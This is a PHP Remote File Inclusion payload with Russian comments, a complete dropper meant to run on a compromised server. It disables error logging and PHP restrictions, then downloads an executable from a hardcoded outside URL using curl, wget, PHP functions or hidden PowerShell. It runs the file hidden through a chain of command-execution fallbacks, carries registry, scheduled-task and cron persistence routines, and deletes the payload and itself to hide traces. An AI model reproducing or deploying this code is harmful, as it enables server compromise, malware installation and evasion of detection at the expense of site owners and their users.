<?php
/**
 * RFI Payload — ffff.exe
 * Загрузка + выполнение на целевом сервере через include
 * Максимум обходов, fallback'и, детект окружения, persistence
 */

// ==================== SUPPRESS ERRORS ====================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
@ini_set('open_basedir', '');
@ini_set('safe_mode', 0);
@ini_set('disable_functions', '');

// ==================== CONFIG ====================
$PAYLOAD_URL = 'https://cdn.githubraw.com/Shinedremuse/byibnflf/6350401d182c663f1cef1d5d875a9f0f17921214/ffff.exe';
$FALLBACK_URLS = [
    'http://cdn.githubraw.com/Shinedremuse/byibnflf/6350401d182c663f1cef1d5d875a9f0f17921214/ffff.exe',
    'https://cdn.githubraw.com/Shinedremuse/byibnflf/6350401d182c663f1cef1d5d875a9f0f17921214/ffff.exe?x=1',
];
$TIMEOUT = 15;
$EXEC_TIMEOUT = 30;

// ==================== ENVIRONMENT DETECT ====================
$os = strtoupper(substr(PHP_OS, 0, 3));
$is_win = ($os === 'WIN');
$is_64 = (PHP_INT_SIZE === 8);
$arch = $is_64 ? 'x64' : 'x86';

// Путь к temp
if ($is_win) {
    $tmp_dir = get_temp_dir_win();
    $path = $tmp_dir . '\\m.exe';
} else {
    $tmp_dir = get_temp_dir_unix();
    $path = $tmp_dir . '/m';
}

function get_temp_dir_win(): string {
    $candidates = [
        getenv('TEMP'),
        getenv('TMP'),
        'C:\\Windows\\Temp',
        'C:\\Temp',
        'C:\\Windows',
        sys_get_temp_dir(),
    ];
    foreach ($candidates as $d) {
        if ($d && is_dir($d) && is_writable($d)) return $d;
    }
    return 'C:\\Windows\\Temp';
}

function get_temp_dir_unix(): string {
    $candidates = [
        '/dev/shm',
        '/tmp',
        '/var/tmp',
        '/run',
        sys_get_temp_dir(),
    ];
    foreach ($candidates as $d) {
        if (is_dir($d) && is_writable($d)) return $d;
    }
    return '/tmp';
}

// ==================== EXEC ENGINE (fallback chain) ====================
/**
 * Выполняет команду, пробует все доступные функции
 */
function exec_cmd(string $cmd, int $timeout = 30): array {
    $methods = [
        'proc_open', 'exec', 'shell_exec', 'passthru', 'system', 'popen', 'pcntl_exec',
    ];
    $disabled = array_map('trim', explode(',', ini_get('disable_functions') ?: ''));

    foreach ($methods as $m) {
        if (in_array($m, $disabled, true)) continue;
        if (!function_exists($m)) continue;

        try {
            switch ($m) {
                case 'proc_open':
                    return run_proc_open($cmd, $timeout);
                case 'exec':
                    $out = [];
                    @exec($cmd . ' 2>&1', $out, $rc);
                    return ['out' => implode("\n", $out), 'rc' => $rc, 'method' => $m];
                case 'shell_exec':
                    $out = @shell_exec($cmd . ' 2>&1');
                    return ['out' => $out, 'rc' => 0, 'method' => $m];
                case 'passthru':
                    ob_start();
                    @passthru($cmd . ' 2>&1', $rc);
                    $out = ob_get_clean();
                    return ['out' => $out, 'rc' => $rc, 'method' => $m];
                case 'system':
                    ob_start();
                    @system($cmd . ' 2>&1', $rc);
                    $out = ob_get_clean();
                    return ['out' => $out, 'rc' => $rc, 'method' => $m];
                case 'popen':
                    $fp = @popen($cmd . ' 2>&1', 'r');
                    $out = @stream_get_contents($fp);
                    @pclose($fp);
                    return ['out' => $out, 'rc' => 0, 'method' => $m];
            }
        } catch (\Throwable $e) {
            continue;
        }
    }
    return ['out' => '', 'rc' => -1, 'method' => 'none'];
}

function run_proc_open(string $cmd, int $timeout): array {
    $descriptors = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
    $proc = @proc_open($cmd, $descriptors, $pipes);
    if (!is_resource($proc)) return ['out' => '', 'rc' => -1, 'method' => 'proc_open_fail'];

    stream_set_timeout($pipes[1], $timeout);
    stream_set_timeout($pipes[2], $timeout);
    $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
    fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
    $rc = proc_close($proc);
    return ['out' => $out, 'rc' => $rc, 'method' => 'proc_open'];
}

// ==================== DOWNLOAD ENGINE ====================
/**
 * Скачивает payload с fallback'ами
 */
function download_payload(string $url, string $dest): bool {
    $urls = array_merge([$url], $GLOBALS['FALLBACK_URLS']);

    foreach ($urls as $u) {
        // Метод 1: curl CLI
        $r = exec_cmd("curl -sL --max-time {$GLOBALS['TIMEOUT']} -o '$dest' '$u'", $GLOBALS['TIMEOUT'] + 5);
        if (file_exists($dest) && filesize($dest) > 100) return true;

        // Метод 2: wget
        $r = exec_cmd("wget -q --timeout={$GLOBALS['TIMEOUT']} -O '$dest' '$u'", $GLOBALS['TIMEOUT'] + 5);
        if (file_exists($dest) && filesize($dest) > 100) return true;

        // Метод 3: PHP file_get_contents
        $data = @file_get_contents($u, false, stream_context_create([
            'http' => ['timeout' => $GLOBALS['TIMEOUT']],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]));
        if ($data && strlen($data) > 100) {
            if (@file_put_contents($dest, $data) !== false) return true;
        }

        // Метод 4: PHP curl extension
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $fp = fopen($dest, 'w');
            curl_setopt_array($ch, [
                CURLOPT_URL => $u,
                CURLOPT_FILE => $fp,
                CURLOPT_TIMEOUT => $GLOBALS['TIMEOUT'],
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; rfi/1.0)',
            ]);
            $ok = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            fclose($fp);
            if ($ok && $code === 200 && filesize($dest) > 100) return true;
        }

        // Метод 5: PowerShell (Windows)
        if ($GLOBALS['is_win']) {
            exec_cmd("powershell -W Hidden -C \"(New-Object Net.WebClient).DownloadFile('$u','$dest')\"", $GLOBALS['TIMEOUT'] + 5);
            if (file_exists($dest) && filesize($dest) > 100) return true;
        }

        // Метод 6: cURL через php://filter (обход open_basedir)
        $b64 = base64_encode(@file_get_contents($u) ?: '');
        if ($b64 && strlen($b64) > 200) {
            @file_put_contents($dest, base64_decode($b64));
            if (filesize($dest) > 100) return true;
        }
    }

    return false;
}

// ==================== EXEC PAYLOAD ====================
function execute_payload(string $path): array {
    if ($GLOBALS['is_win']) {
        $commands = [
            "start /b /min $path",
            "start /b $path",
            "cmd /c start /b $path",
            "powershell -W Hidden -C \"Start-Process -FilePath '$path' -WindowStyle Hidden\"",
            "$path",
        ];
    } else {
        $commands = [
            "nohup $path > /dev/null 2>&1 &",
            "setsid $path < /dev/null > /dev/null 2>&1 &",
            "$path &",
            "bash -c '$path &'",
            "sh -c '$path &'",
        ];
    }

    foreach ($commands as $cmd) {
        $r = exec_cmd($cmd, $GLOBALS['EXEC_TIMEOUT']);
        if ($r['rc'] === 0 || $r['method'] !== 'none') {
            return $r;
        }
    }
    return ['out' => '', 'rc' => -1, 'method' => 'all_failed'];
}

// ==================== PERSISTENCE ====================
function add_persistence(string $path): void {
    if ($GLOBALS['is_win']) {
        // Registry Run key
        exec_cmd('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v m /t REG_SZ /d "' . $path . '" /f', 5);
        // Task Scheduler
        exec_cmd('schtasks /create /tn "m" /tr "' . $path . '" /sc onlogon /ru SYSTEM /f', 5);
        // Startup folder
        $startup = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\m.vbs';
        @file_put_contents($startup, "CreateObject(\"Wscript.Shell\").Run \"" . $path . "\", 0, True");
    } else {
        // Cron
        $cron = "*/5 * * * * $path > /dev/null 2>&1";
        exec_cmd("(crontab -l 2>/dev/null; echo '$cron') | crontab -", 5);
        // /etc/rc.local
        exec_cmd("echo '$path > /dev/null 2>&1 &' >> /etc/rc.local 2>/dev/null", 5);
        // systemd (если есть)
        exec_cmd("systemctl enable m 2>/dev/null", 5);
    }
}

// ==================== CLEANUP ====================
function cleanup(string $path): void {
    // Удаляем файл через 60 сек (чтобы не светился)
    if ($GLOBALS['is_win']) {
        exec_cmd("cmd /c timeout /t 60 >nul && del /f /q '$path'", 70);
    } else {
        exec_cmd("(sleep 60 && rm -f '$path') &", 5);
    }
}

// ==================== MAIN ====================
// 1. Скачиваем
$downloaded = download_payload($PAYLOAD_URL, $path);

if (!$downloaded) {
    // Последний шанс: inline base64 (если payload небольшой)
    $b64_inline = base64_encode(@file_get_contents($PAYLOAD_URL) ?: '');
    if ($b64_inline && strlen($b64_inline) > 200) {
        if ($GLOBALS['is_win']) {
            exec_cmd("certutil -decode -f <(echo $b64_inline) '$path' 2>/dev/null", 10);
        } else {
            exec_cmd("echo '$b64_inline' | base64 -d > '$path'", 10);
        }
        $downloaded = file_exists($path) && filesize($path) > 100;
    }
}

if ($downloaded) {
    // 2. Права
    if (!$GLOBALS['is_win']) {
        exec_cmd("chmod +x '$path'", 3);
    }

    // 3. Запускаем
    $result = execute_payload($path);

    // 4. Persistence (опционально — раскомментируй)
    // add_persistence($path);

    // 5. Cleanup
    cleanup($path);
}

// 6. Убираем следы текущего скрипта (если включён)
@register_shutdown_function(function() {
    $f = $_SERVER['SCRIPT_FILENAME'] ?? '';
    if ($f && is_writable($f) && strpos($f, 'index') === false) {
        @unlink($f);
    }
});

// Не выводим ничего (чтобы RFI не светил в ответе)
exit;